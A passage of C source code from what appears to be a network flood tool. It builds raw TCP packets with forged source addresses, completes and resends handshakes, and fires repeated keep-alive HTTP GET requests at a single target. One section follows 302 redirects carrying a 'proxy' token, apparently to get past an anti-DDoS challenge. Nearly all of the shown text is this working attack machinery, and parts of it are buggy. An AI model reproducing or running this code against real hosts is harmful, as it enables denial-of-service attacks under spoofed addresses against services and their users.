                        //update_synack_hash_table(inet_addr(destIp), ntohs(tcpkt->dest), ntohl(tcpkt->seq), ntohl(tcpkt->ack_seq), tcpkt->syn, tcpkt->ack, socketfd);
                        update_synack_hash_table(inet_addr(sourceIp), ntohs(sendtcp->source), ntohl(tcpkt->seq), ntohl(tcpkt->ack_seq), tcpkt->syn, tcpkt->ack, socketfd[num], 0);
                        update_ack_hash_table(inet_addr(sourceIp), ntohs(sendtcp->source), ntohl(sendtcp->seq), ntohl(sendtcp->ack_seq), socketfd[i], 0);

                        int isendsize = -1;
                        //printf("Source IP: %s:%d dest ip: %s:%d syn: %d ack: %d\n", sourceIp, ntohs(sendtcp->source), destIp, ntohs(sendtcp->dest), sendtcp->syn, sendtcp->ack);
                        isendsize = sendto(socketfd[num], cSendbuff, sizeof(struct iphdr)+sizeof(struct tcphdr), 0, (struct sockaddr *)(&addr), sizeof(struct sockaddr_in));
                        if(isendsize < 0)
                        {
                            printf("send check ack message failed %d\n", socketfd[i]);
                        }
                    }
                }   
            }
            else if(tcpkt->fin == 1 && tcpkt->ack == 1)
            {
                struct tcp_status *item;
                if((item = lookup(inet_addr(sourceIp), ntohs(sendtcp->source))) != NULL)
                {
                    if(item->finFlag == 1 && item->sFinAckFlag ==0)
                    {	
                        item->sFinAckFlag = 1;
                        item->cFinAckSeq = ntohl(tcpkt->seq);
                        item->cFinAckAck = ntohl(tcpkt->ack_seq);
                        recvFinAckPacketNum++;
                        //update_fin_ack_hash_table(inet_addr(sourceIp), ntohs(sendtcp->source), ntohl(tcpkt->seq), ntohl(tcpkt->ack_seq), socketfd[i]);
                        //update_fin_ack_hash_table(inet_addr(destIp), ntohs(tcpkt->dest), ntohl(tcpkt->seq), ntohl(tcpkt->ack_seq), socketfd[i]);
                        //update_fin_backack_hash_table(inet_addr(sourceIp), ntohs(sendtcp->source), ntohl(sendtcp->seq), ntohl(sendtcp->ack_seq), socketfd[i]);
                        item->sAckForFinFlag = 1;
                        item->cFinBackAckSeq = ntohl(sendtcp->seq);
                        item->cFinBackAckAck = ntohl(sendtcp->ack_seq);
                        sendAckForFin++;

                        int isendsize = -1;
                        isendsize = sendto(socketfd[i], cSendbuff, sizeof(struct iphdr)+sizeof(struct tcphdr), 0, (struct sockaddr *)(&addr), sizeof(struct sockaddr_in));
                        if(isendsize < 0)
                        {
                            printf("send fin ack message failed!!!!!!\n");
                        }
                    }
                }
            }
        }
    }
}

void slave_check_ack_thread(void *arg)
{
    while(1)
    {
        int i = 0;
        struct tcp_status *item = NULL;

        for(i=0; i<STATUS_LIST_HASH_SIZE;i++)
        {
            item = g_tcp_status_list[i];
            for(;item != NULL;item = item->next)
            {
                if(item->synFlag == 1 && item->synAckFlag ==1 && item->ackFlag != 1)
                {
                    item->ackFlag = 1;
                    struct iphdr *sendip;
                    struct tcphdr *sendtcp;
                    char cSendbuff[sizeof(struct iphdr) + sizeof(struct tcphdr)];
                    memset(cSendbuff, 0x0, sizeof(cSendbuff));
                    sendip = (struct iphdr *)cSendbuff;
                    sendtcp = (struct tcphdr *)(cSendbuff + sizeof(struct iphdr));

                    sendip->ihl = 5;
                    sendip->version = 4;
                    sendip->tos = 0;
                    sendip->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr);
                    sendip->id = htonl(54321);
                    sendip->frag_off = 0;
                    sendip->ttl = 64;
                    sendip->protocol = IPPROTO_TCP;
                    sendip->check = 0;
                    sendip->saddr = item->ipaddr;
                    sendip->daddr = inet_addr(dstIpBuf);
                    sendip->check = csum((unsigned short *)cSendbuff, sendip->tot_len);

                    sendtcp->source = htons(item->port);
                    sendtcp->dest = htons(d_iPort);
                    sendtcp->seq = htonl(item->cAckSeq);
                    sendtcp->ack_seq = htonl(item->cAckAck);
                    sendtcp->doff = 5;
                    sendtcp->fin = 0;
                    sendtcp->syn = 0;
                    sendtcp->rst = 0;
                    sendtcp->psh = 0;
                    sendtcp->ack = 1;
                    sendtcp->urg = 0;
                    sendtcp->window = htons (5840);
                    sendtcp->check = 0;
                    sendtcp->urg_ptr = 0;

                    char *pseudogram;
                    struct pseudo_header psh;
                    psh.source_address = item->ipaddr;
                    psh.dest_address = inet_addr(dstIpBuf);
                    psh.placeholder = 0;
                    psh.protocol = IPPROTO_TCP;
                    psh.tcp_length = htons(sizeof(struct tcphdr));

                    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
                    pseudogram = malloc(psize);
                    memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
                    memcpy(pseudogram + sizeof(struct pseudo_header) , sendtcp, sizeof(struct tcphdr));
                    sendtcp->check = 0;
                    sendtcp->check = csum( (unsigned short*) pseudogram , psize);

                    struct sockaddr_in addr;
                    memset( &addr, 0x0, sizeof(struct sockaddr_in));
                    addr.sin_family = AF_INET;
                    addr.sin_port = htons(d_iPort);
                    addr.sin_addr.s_addr = inet_addr(dstIpBuf);

                    struct sockaddr_in source, dest;
                    memset(&source, 0, sizeof(source));
                    source.sin_addr.s_addr = sendip->saddr;
                    memset(&dest, 0, sizeof(dest));
                    dest.sin_addr.s_addr = sendip->daddr;
                    char sourceIp[16] = "";
                    char destIp[16] = "";
                    strcpy(sourceIp, inet_ntoa(source.sin_addr));
                    strcpy(destIp, inet_ntoa(dest.sin_addr));
                    threeHandshakeNum++;

                    int isendsize = sendto(item->socket, cSendbuff, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *)(&addr), sizeof(struct sockaddr_in));
                    if( isendsize < 0)
                    {
                        printf("send fin failed!!!!!!\n");
                    }
                }
            }
        }
    }
}

void slave_check_httpget_thread(void *arg)
{
    int num = (int *)arg;
    socketHttpfd[num] = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (socketHttpfd[num] < 0)
    {
        printf( "%s", strerror(errno));
        return;
    }
    int opt = 1;
    int bufsize = 50 * 1024;
    int flag1 = setsockopt( socketHttpfd[num], IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
    int flag2 = setsockopt( socketHttpfd[num], SOL_SOCKET, SO_RCVBUF,&bufsize,sizeof(bufsize));

    while(1)
    {
        char rcvbuf[1024] = "";
        struct sockaddr_in client;
        int len =  sizeof(client);
        int irecvsize = recvfrom(socketHttpfd[num], rcvbuf, 1024, 0, (struct sockaddr *)&client, &len);
        if(0 > irecvsize)
        {
            close(socketHttpfd[num]);
            exit(1);
        }
        struct iphdr *ip1 = (struct iphdr *)(rcvbuf);
        int iphdrlen1 = ip1->ihl*4;
        struct tcphdr *tcpkt=(struct tcphdr*)(rcvbuf + iphdrlen1);

        int i, findIp = 0;
        char sourceIp[16] = "";
        char destIp[16] = "";
        struct sockaddr_in source, dest;

        memset(&source, 0, sizeof(source));
        source.sin_addr.s_addr = ip1->saddr;
        memset(&dest, 0, sizeof(dest));
        dest.sin_addr.s_addr = ip1->daddr;

        strcpy(sourceIp, inet_ntoa(source.sin_addr));
        strcpy(destIp, inet_ntoa(dest.sin_addr));

        for(i=0;i</*m_iUserCount*/srcIpCount;i++)
        {
            if(!strncmp(srcIpBuf[i], destIp, strlen(srcIpBuf[i])))
            {
                findIp = 1;
            }
        }
        if(findIp == 1 && !strstr(sourceIp, "254") && ntohs(tcpkt->dest) > attackEndPort)
        {
            char *payload = rcvbuf + sizeof(struct iphdr) + sizeof(struct tcphdr);
            if (strstr(payload, "HTTP/1.1 200 OK"))
            {
                struct http_status *item;
                if((item = lookupHttp(inet_addr(destIp), ntohs(tcpkt->dest))) != NULL)
                {
                    if(item->httpResFlag != 1)
                    {			
                       item->httpResFlag = 1;
                       httpRespondNum++;
                       //write(STDOUT_FILENO, payload, strlen(payload));	
                    }
                }
            }
            if (strstr(payload, "HTTP/1.1 302 OK"))
            {
                struct http_status *item;
                if((item = lookupHttp(inet_addr(destIp), ntohs(tcpkt->dest))) != NULL)
                {
                    if(item->httpResFlag != 1)
                    {
                        item->httpResFlag = 1;
                        httpRespond302Num++;
                        //write(STDOUT_FILENO, payload, strlen(payload));
                        char *ptr = strstr(payload, "Location:");
                        char *ptr2 = strstr(ptr, "\r\n");
                        char urlInfo[1024] = "";
                        strncpy(urlInfo, ptr, ptr2-ptr);
                        char *cookieInfo = strstr(urlInfo, "proxy");
		
                        char httpGetUrl[1024] = "";
                        sprintf(httpGetUrl, "GET /%s HTTP/1.1\r\nUser-Agent: curl/7.29.0\r\nHost: %s\r\nAccept: */*\r\n\r\n", cookieInfo, dstIpBuf);

                        int request_len;
                        int socket_file_descriptor;
                        ssize_t nbytes_total, nbytes_last;
                        struct sockaddr_in sockaddr_in;
                        char request[1024] = "";		

                        struct protoent *protoent = getprotobyname("tcp");
                        if (protoent == NULL) 
                        {
                        perror("getprotobyname");
                        exit(EXIT_FAILURE);
                        }
                        socket_file_descriptor = socket(AF_INET, SOCK_STREAM, protoent->p_proto);
                        if (socket_file_descriptor == -1) 
                        {
                            perror("socket");
                            exit(EXIT_FAILURE);
                        }

                        struct sockaddr_in source, dest;
                        memset(&source, 0, sizeof(source));
                        memset(&dest, 0, sizeof(dest));

                        source.sin_addr.s_addr = ip1->saddr;
                        dest.sin_addr.s_addr = ip1->daddr;
                        char sourceIp[16] = "";
                        char destIp[16] = "";
                        strcpy(sourceIp, inet_ntoa(source.sin_addr));
                        strcpy(destIp, inet_ntoa(dest.sin_addr));
                        struct sockaddr_in addr;
                        addr.sin_family = AF_INET;
                        addr.sin_port = htons (random() % 65535);
                        addr.sin_addr.s_addr = inet_addr(destIp);
                        int ret  = bind (socket_file_descriptor, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
                        if (ret < 0)
                        {
                            printf("bind error\n");
                        }
                        sockaddr_in.sin_addr.s_addr = inet_addr(dstIpBuf);
                        sockaddr_in.sin_family = AF_INET;
                        sockaddr_in.sin_port = htons(80);

                        if (connect(socket_file_descriptor, (struct sockaddr*)&sockaddr_in, sizeof(sockaddr_in)) == -1) 
                    {
                        perror("connect");
                        exit(EXIT_FAILURE);
                    }

                        nbytes_last = write(socket_file_descriptor, httpGetUrl/*request + nbytes_total*/, strlen(httpGetUrl));
                        int sourcePort = ntohs(tcpkt->dest);
                    }
                }
            }

        }
    }
}

void slave_check_resend_thread(void *arg)
{
    int count = resendFlowNum;
    while(1)
    {
        int i = 0,j = 0;
        struct tcp_status *item = NULL;
        for(i=0; i<STATUS_LIST_HASH_SIZE;i++)
        {
            item = g_tcp_status_list[i];
            for(;item != NULL;item = item->next)
            {
                if(count != 0)
                {
                    if(item->synFlag == 1 && item->synAckFlag == 1 && item->ackFlag == 1 && resendFlag == 1 && item->reSendNum != 0)
                        count--;
                    for (j=0;j<resendFlowNum;j++)
                    {
                        if(item->synFlag == 1 && item->synAckFlag == 1 && item->ackFlag == 1 && resendFlag == 1 && item->reSendNum != 0)
                        {
                            item->reSendNum--;
                            struct iphdr *sendip;
                            struct tcphdr *sendtcp;
                            char cSendbuff[sizeof(struct iphdr) + sizeof(struct tcphdr)];
                            memset(cSendbuff, 0x0, sizeof(cSendbuff));
                            sendip = (struct iphdr *)cSendbuff;
                            sendtcp = (struct tcphdr *)(cSendbuff + sizeof(struct iphdr));			

                            sendip->ihl = 5;
                            sendip->version = 4;
                            sendip->tos = 0;
                            sendip->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr);
                            sendip->id = htonl(54321);
                            sendip->frag_off = 0;
                            sendip->ttl = 255;
                            sendip->protocol = IPPROTO_TCP;
                            sendip->check = 0;
                            sendip->saddr = item->ipaddr;
                            sendip->daddr = inet_addr(dstIpBuf);
                            sendip->check = csum((unsigned short *)cSendbuff, sendip->tot_len);

                            sendtcp->source = htons(item->port);
                            sendtcp->dest = htons(d_iPort);

                            sendtcp->seq = 0;
                            sendtcp->ack_seq = 0;
                            sendtcp->doff = 5;
                            sendtcp->fin = 0;
                            sendtcp->syn = 0;
                            sendtcp->rst = 0;
                            sendtcp->psh = 0;
                            sendtcp->ack = 0;
                            sendtcp->urg = 0;
                            sendtcp->window = htons(windowSize);
                            sendtcp->check = 0;
                            sendtcp->urg_ptr = 0; 

                            if(item->reSendType == RESEND_SYN)
                            {
                                sendtcp->seq = htonl(item->cSynSeq);
                                sendtcp->ack_seq = htonl(item->cSynAck);
                                sendtcp->syn = 1;
                            }
                            else if(item->reSendType == RESEND_ACK_FOR_SYNACK)
                            {
                                sendtcp->seq = htonl(item->cAckSeq);
                                sendtcp->ack_seq = htonl(item->cAckAck);
                                sendtcp->ack = 1;
                            }
                            else if(item->reSendType == RESEND_FIN)
                            {
                                sendtcp->seq = htonl(item->cFinSeq);
                                sendtcp->ack_seq = htonl(item->cFinAck);
                                sendtcp->fin = 1;
                                sendtcp->ack = 1;	
                            }
                            else if(item->reSendType == RESEND_ACK_FOR_FINACK)
                            {
                                sendtcp->seq = htonl(item->cFinBackAckSeq);
                                sendtcp->ack_seq = htonl(item->cFinBackAckAck);
                                sendtcp->ack = 1;
                            }
                            else if(item->reSendType == RESEND_RST)
                            {
                                sendtcp->rst = 1;
                            }	
                            else if(item->reSendType == RESENF_HTTP_GET)
                            {

                            }

                            char *pseudogram;	
                            struct pseudo_header psh;
                            int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
                            pseudogram = malloc(psize);
                            memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
                            memcpy(pseudogram + sizeof(struct pseudo_header) , sendtcp, sizeof(struct tcphdr));
                            sendtcp->check = 0;
                            sendtcp->check = csum( (unsigned short*) pseudogram , psize);

                            struct sockaddr_in addr;
                            memset( &addr, 0x0, sizeof(struct sockaddr_in));
                            addr.sin_family = AF_INET;
                            addr.sin_port = htons(d_iPort);
                            addr.sin_addr.s_addr = inet_addr(dstIpBuf);

                            struct sockaddr_in source, dest;
                            memset(&source, 0, sizeof(source));
                            source.sin_addr.s_addr = sendip->saddr;
                            memset(&dest, 0, sizeof(dest));
                            dest.sin_addr.s_addr = sendip->daddr;
                            char sourceIp[16] = "";
                            char destIp[16] = "";
                            strcpy(sourceIp, inet_ntoa(source.sin_addr));
                            strcpy(destIp, inet_ntoa(dest.sin_addr));
                        
                            int isendsize = sendto(item->socket, cSendbuff, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *)(&addr), sizeof(struct sockaddr_in));
                            if( isendsize < 0)
                            {
                                printf("send resend packet failed！！！！！！\n");
                            }   
                        }
                    }
                }
            }
        }
    }
}
int httpRecv = 0;
int socketNum;

static __inline__ uint16_t compute_checksum(uint16_t * buff,int num_bytes,uint32_t sum)
{	
    uint16_t last_byte;

    while (num_bytes>1)
    {
        sum+=*buff++;
        num_bytes-=2;
    }

    if (num_bytes==1)
    {
        last_byte=(uint16_t)*((uint8_t *)buff);
        sum+=last_byte<<8;
    }

    while (sum&0xffff0000)
    {
        sum=(sum>>16)+(sum&0xffff);
    }

    return (uint16_t)(~sum);
}

static unsigned short in_chksum_tcp( unsigned short *h, unsigned short * d, int dlen )
{
    unsigned int cksum;
    unsigned short answer=0;


    cksum  = h[0];
    cksum += h[1];
    cksum += h[2];
    cksum += h[3];
    cksum += h[4];
    cksum += h[5];

    cksum += d[0];
    cksum += d[1];
    cksum += d[2];
    cksum += d[3];
    cksum += d[4];
    cksum += d[5];
    cksum += d[6];
    cksum += d[7];
    cksum += d[8];
    cksum += d[9];

    dlen  -= 20;  
    d     += 10;

    while(dlen >=32) {
        cksum += d[0];
        cksum += d[1];
        cksum += d[2];
        cksum += d[3];
        cksum += d[4];
        cksum += d[5];
        cksum += d[6];
        cksum += d[7];
        cksum += d[8];
        cksum += d[9];
        cksum += d[10];
        cksum += d[11];
        cksum += d[12];
        cksum += d[13];
        cksum += d[14];
        cksum += d[15];
        d     += 16;
        dlen  -= 32;
    }

    while(dlen >=8) {
        cksum += d[0];
        cksum += d[1];
        cksum += d[2];
        cksum += d[3];
        d     += 4;   
        dlen  -= 8;
    }

    while(dlen > 1) {
        cksum += *d++;
        dlen  -= 2;
    }

    if( dlen == 1 ) { 

        *(unsigned char*)(&answer) = (*(unsigned char*)d);
        cksum += answer;
    }
    cksum  = (cksum >> 16) + (cksum & 0x0000ffff);
    cksum += (cksum >> 16);
    return (unsigned short)(~cksum);
}

void send_http_get_fun(int socket, unsigned long saddr, unsigned long daddr, int sport, unsigned long seq, unsigned long ack)
{
	char datagram[4096] , source_ip[32] , *data , *pseudogram;
	memset (datagram, 0, 4096);
	struct iphdr *iph = (struct iphdr *) datagram;
	struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof(struct iphdr));
	struct sockaddr_in sin;
	struct pseudo_header psh;

	int request_len;
	data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);
	
	sin.sin_family = AF_INET;
	sin.sin_port = htons(80);
	sin.sin_addr.s_addr = daddr;

	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr) + strlen(data);
	iph->id = htonl (54321);
	iph->frag_off = 0;
	iph->ttl = 255;
	iph->protocol = IPPROTO_TCP;
	iph->check = 0;
	iph->saddr = saddr;
	iph->daddr = daddr;//sin.sin_addr.s_addr;
	iph->check = csum ((unsigned short *) datagram, iph->tot_len);

	tcph->source = htons (sport);
	tcph->dest = htons (80);
	tcph->seq = htonl(seq);
	tcph->ack_seq = htonl(ack);
	tcph->doff = 5;
	tcph->fin=0;
	tcph->syn=0;
	tcph->rst=0;
	tcph->psh=1;
	tcph->ack=1;
	tcph->urg=0;
	tcph->window = htons (5840);
	tcph->urg_ptr = 0;

	if(httpGetKeepAlive == 1)
    {
        char request_template[] = "GET %s HTTP/1.1\r\nUser-Agent: curl/7.29.0\r\nHost: %s\r\nKeep-Alive: 3000\r\nConnection: keep-alive\r\n\r\n";
        if(strlen(httpGetHead) > 0)
            request_len = sprintf(data, request_template, httpGetHead, httpGetHost);
        else
            request_len = sprintf(data, request_template, "/", httpGetHost);
    }
    else
    {           
        char request_template[] = "GET %s HTTP/1.1\r\nUser-Agent: curl/7.29.0\r\nHost: %s\r\nAccept: */*\r\n\r\n";
        if(strlen(httpGetHead) > 0)
            request_len = sprintf(data, request_template, httpGetHead, httpGetHost);
        else
            request_len = sprintf(data, request_template, "/", httpGetHost);
    }
	psh.source_address = saddr;//iph->saddr;
	psh.dest_address = daddr;//iph->daddr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_TCP;
	psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data));

	int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(data);
	pseudogram = malloc(psize);
	memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
	memcpy(pseudogram + sizeof(struct pseudo_header) , (char*)tcph , sizeof(struct tcphdr) + strlen(data));
	tcph->check = in_chksum_tcp((unsigned short *)&psh, (unsigned short *)tcph, sizeof(struct tcphdr)+strlen(data));//tcph, sizeof(struct tcphdr) + strlen(data));	

	uint32_t sum;
	sum=0;
	int i;
	uint16_t *ptr=(uint16_t*)&psh;
	for (i = 0; i < 6; i++) 
	{
      	sum += *ptr++;
    }
	httpGetNum++;
	if(httpGetKeepAlive == 1)
	{
	    int j;
	    for(j=0;j<HTTPGETCOUNT;j++)
	    {
 	        int isendsize = sendto(socket, datagram, sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(data), 0, (struct sockaddr *)(&sin), sizeof(struct sockaddr_in));
	        if( isendsize < 0)
	        {
	           printf(" send http get failed!!!!!!s\n");
	        }
	    }
	}
	else
	{
	    int isendsize = sendto(socket, datagram, sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(data), 0, (struct sockaddr *)(&sin), sizeof(struct sockaddr_in));
        if( isendsize < 0)
        {
            printf("send http get failed!!!!!!\n");
        }
	}

}

void slave_http_get_thread(void *arg)
{

    int epollNum = (int *)arg;
    int i, fromPort, toPort;
    fromPort = attackEndPort;
    toPort = endPort;
    socketNum = toPort - fromPort;
    int epollFd;
    epollFd = epoll_create(_MAX_SOCKFD_COUNT);

    sigset_t signal_mask;
    sigemptyset(&signal_mask);
    sigaddset(&signal_mask, SIGPIPE);
    pthread_sigmask(SIG_BLOCK, &signal_mask, NULL);

    int j = 0;
    m_pHttpUserStatus = (struct HttpStatus*)malloc(epollNum * sizeof(struct HttpStatus));

    for(i=0; i < epollNum; i++)
    {
        m_pHttpUserStatus[i].iUserStatus = FREE;
        if(srcIpCount == 1)
          strcpy(m_pHttpUserStatus[i].cSendSrcIp, srcIpBuf[0]);
        else
        {
            if(j <= srcIpCount)
            {
                strcpy(m_pHttpUserStatus[i].cSendSrcIp, srcIpBuf[j]);
                j++;
            }
            else
                j = 0;
        }
        if(sPortType == SPECIFYPORT)
            createHttpGetPacket(i, sPortType, 0, 0);
    }

    for(i=0; i<epollNum/*m_iUserCount*/; i++)
    {
        struct epoll_event event;

        m_pHttpUserStatus[i].iSockFd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(m_pHttpUserStatus[i].iSockFd < 0 )
        {
            printf("[CEpollClient error]: init socket fail\n");
            return;
        }   
        int opt = 1;    
        int bufsize = 50 * 1024;
        int flag1 = setsockopt( m_pHttpUserStatus[i].iSockFd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
        int flag2 = setsockopt( m_pHttpUserStatus[i].iSockFd, SOL_SOCKET, SO_RCVBUF,&bufsize,sizeof(bufsize));
        if( m_pHttpUserStatus[i].iSockFd < 0)
            printf("[CEpollClient error]: RunFun, connect fail \n");

        unsigned long ul = 1;
        ioctl(m_pHttpUserStatus[i].iSockFd, FIONBIO, &ul);

        m_HttpSockFd_UserId[m_pHttpUserStatus[i].iSockFd] = i;
        m_pHttpUserStatus[i].iUserStatus = CONNECT_OK;
        event.data.fd = m_pHttpUserStatus[i].iSockFd;
        event.events = EPOLLIN|EPOLLOUT|EPOLLET;
        epoll_ctl(epollFd, EPOLL_CTL_ADD, event.data.fd, &event);
    }
    
    httpStartPort = fromPort;
    while(1)
    {
        struct epoll_event events[_MAX_SOCKFD_COUNT];
        char buffer[1024];
        int ifd = 0;
        memset(buffer,0,1024);
        int nfds = epoll_wait(epollFd, events, _MAX_SOCKFD_COUNT, 100 );
        for (ifd=0; ifd<nfds; ifd++)
        {
            if(events[ifd].events & (EPOLLERR|EPOLLHUP))
            {
                printf("======epool events[i].events %d======\n", events[i].events);
            }
            if((events[ifd].events & EPOLLERR) || (events[ifd].events & EPOLLHUP) )//|| (!(events[i].events & EPOLLIN)))
            {
                fprintf (stderr, "epoll error\n");
                close (events[ifd].data.fd);
                exit(1);
                continue;
            }
            struct epoll_event event_nfds;
            int iclientsockfd = events[ifd].data.fd;
            int iuserid = m_HttpSockFd_UserId[iclientsockfd];

            if(events[ifd].events & EPOLLOUT)
            {
                int isendsize = -1;
                unsigned long hashKey;
                unsigned long sIpNum;
                struct sockaddr_in addr;
                addr.sin_family = AF_INET;
                addr.sin_port = htons(d_iPort);
                addr.sin_addr.s_addr = inet_addr(dstIpBuf);

                if(sPortType == RANDOMPORT)
                {
                    if(multiIp == 1)
                        createHttpGetPacket(iuserid, sPortType, 0, 1);
                    else
                        createHttpGetPacket(iuserid, sPortType, 0, 0);
                }
                if(sPortType == RANGEPORT)
                {
                    if(multiIp == 1)
                    {
                        createHttpGetPacket(iuserid, 2, httpStartPort, 1);
                        httpStartPort++;
                        if(httpStartPort == toPort)
                            httpStartPort = fromPort;
                    }
                    else
                    {
                        createHttpGetPacket(iuserid, 2, httpStartPort, 0);
                        httpStartPort++;
                        if(httpStartPort == toPort)
                            httpStartPort = fromPort;
                    }
                }
        		sIpNum = inet_addr(m_pHttpUserStatus[iuserid].cSendSrcIp);
                if(CONNECT_OK == m_pHttpUserStatus[iuserid].iUserStatus || RECV_OK == m_pHttpUserStatus[iuserid].iUserStatus)
                {
                    struct http_status *item;
                    if((item = lookupHttp(sIpNum/*inet_addr(destIp)*/, m_pHttpUserStatus[iuserid].cSendSrcPort/*ntohs(sendtcp->source)*/)) == NULL)
                    {
                        update_syn_hash_table(sIpNum, m_pHttpUserStatus[iuserid].cSendSrcPort, m_pHttpUserStatus[iuserid].cSynSeq,  m_pHttpUserStatus[iuserid].cSynAck, m_pHttpUserStatus[iuserid].iSockFd, 1);
                        printf("======send http syn %s,%d======\n", m_pHttpUserStatus[iuserid].cSendSrcIp, m_pHttpUserStatus[iuserid].cSendSrcPort);
                        isendsize = sendto(m_pHttpUserStatus[iuserid].iSockFd, m_pHttpUserStatus[iuserid].cSendbuff, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *)(&addr), sizeof(struct sockaddr_in));
                        if(isendsize < 0)
                        {
                            printf("[CEpollClient error]: SendToServerData, send fail %d\n", isendsize);
                            DelEpoll(m_pHttpUserStatus[iuserid].iSockFd);
                            CloseUser(m_pHttpUserStatus[iuserid].iSockFd);
                            continue;
                        }
                    }

                    event_nfds.events = EPOLLIN|EPOLLET;
                    event_nfds.data.fd = iclientsockfd;
                    epoll_ctl(epollFd, EPOLL_CTL_MOD, event_nfds.data.fd, &event_nfds);
                    m_pHttpUserStatus[iuserid].iUserStatus = SEND_OK;
                }		
            }
            else if(events[ifd].events & EPOLLIN)
            {
                char rcvbuf[1024] = "";
                struct sockaddr_in client;
                int len =  sizeof(client);
                if(SEND_OK == m_pHttpUserStatus[iuserid].iUserStatus &&  m_pHttpUserStatus[iuserid].iUserStatus >0)
                    {
                    int irecvsize = recvfrom(m_pHttpUserStatus[iuserid].iSockFd, rcvbuf, 1024, 0, (struct sockaddr *)&client, &len);
                    if(0 > irecvsize)
                    {
                        printf("[CEpollClient error]: iUserId: %d, recv from server fail\n", iuserid);
                        printf("[CEpollClient error]: RunFun, recv fail");
                        DelEpoll(events[ifd].data.fd);
                        CloseUser(events[ifd].data.fd);
                    }
                    else if(0 == irecvsize)
                    {
                        DelEpoll(events[ifd].data.fd);
                        CloseUser(events[ifd].data.fd);
                        return 0;
                    }
                    else
                    {
                        int i, findIp = 0, ackForFin = 0;
                        char sourceIp[16] = "";
                        char destIp[16] = "";
                        struct sockaddr_in source, dest;
                        struct iphdr *ip1 = (struct iphdr *)(rcvbuf);
                        memset(&source, 0, sizeof(source));
                        memset(&dest, 0, sizeof(dest));
                
                        source.sin_addr.s_addr = ip1->saddr;
                        dest.sin_addr.s_addr = ip1->daddr;

                        strcpy(sourceIp, inet_ntoa(source.sin_addr));
                        strcpy(destIp, inet_ntoa(dest.sin_addr));
                    
                        int iphdrlen1 = ip1->ihl*4;
                        struct tcphdr *tcpkt=(struct tcphdr*)(rcvbuf + iphdrlen1);
                    
                        for(i=0;i<srcIpCount/*m_iUserCount*/;i++)
                        {
                            if(!strncmp(srcIpBuf[i], destIp, strlen(srcIpBuf[i])))
                            {
                                findIp = 1;
                            }
                        }
                                    
                        if(findIp == 1 && !strstr(sourceIp, "254"))
                        {
                            int connectStatus = 0;
                            struct iphdr *sendip;
                            struct tcphdr *sendtcp;

                            char cSendbuff[sizeof(struct iphdr) + sizeof(struct tcphdr)];
                            memset(cSendbuff, 0x0, sizeof(cSendbuff));
                            sendip = (struct iphdr *)cSendbuff;
                            sendtcp = (struct tcphdr *)(cSendbuff + sizeof(struct iphdr));

                            sendip->ihl = 5;
                            sendip->version = 4;
                            sendip->tos = 0;
                            sendip->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr);
                            sendip->id = htonl(54321);
                            sendip->frag_off = 0;
                            sendip->ttl = 64;
                            sendip->protocol = IPPROTO_TCP;
                            sendip->check = 0;
                            sendip->saddr = inet_addr(destIp);//(srcIpBuf[iuserid]);
                            sendip->daddr = inet_addr(dstIpBuf);
                            sendip->check = csum((unsigned short *)cSendbuff, sendip->tot_len);

                            sendtcp->source = tcpkt->dest;
                            sendtcp->dest = tcpkt->source;
                            sendtcp->seq = htonl(ntohl(tcpkt->ack_seq));
                            sendtcp->ack_seq = htonl(ntohl(tcpkt->seq)+1);
                            sendtcp->doff = 5;
                            sendtcp->fin = 0;
                            sendtcp->syn = 0;
                            sendtcp->rst=0;
                            sendtcp->psh=0;
                            sendtcp->ack=1;
                            sendtcp->urg=0;

                            sendtcp->window = htons (5840);
                            sendtcp->check = 0;
                            sendtcp->urg_ptr = 0;
                            char *pseudogram;
                            struct pseudo_header psh;
                            psh.source_address = inet_addr(destIp);//(srcIpBuf[iuserid]);
                            psh.dest_address = inet_addr(dstIpBuf);
                            psh.placeholder = 0;
                            psh.protocol = IPPROTO_TCP;
                            psh.tcp_length = htons(sizeof(struct tcphdr));

                            int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
                            pseudogram = malloc(psize);
                            memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
                            memcpy(pseudogram + sizeof(struct pseudo_header) , sendtcp, sizeof(struct tcphdr));
                            sendtcp->check = 0;
                            sendtcp->check = csum( (unsigned short*) pseudogram , psize);

                            struct sockaddr_in addr;
                            memset( &addr, 0x0, sizeof(struct sockaddr_in));
                            addr.sin_family = AF_INET;
                            addr.sin_port = htons(d_iPort);
                            addr.sin_addr.s_addr = inet_addr(dstIpBuf);
            
                            if (tcpkt->syn == 1 && tcpkt->ack == 1)
                            {
                                if(ntohs(sendtcp->source) > fromPort)
                                {
                                    struct http_status *item;
                                    if((item = lookupHttp(inet_addr(destIp), ntohs(sendtcp->source))) != NULL)// && ntohs(sendtcp->source) > fromPort)
                                    {
                                    if(item->synFlag == 1 && item->synAckFlag != 1)
                                    {
                                        item->synAckFlag = 1;
                                        update_synack_hash_table(inet_addr(destIp), ntohs(sendtcp->source)/*ntohs(tcpkt->dest)*/, ntohl(tcpkt->seq), ntohl(tcpkt->ack_seq), tcpkt->syn, tcpkt->ack, m_pHttpUserStatus[iuserid].iSockFd, 1);					
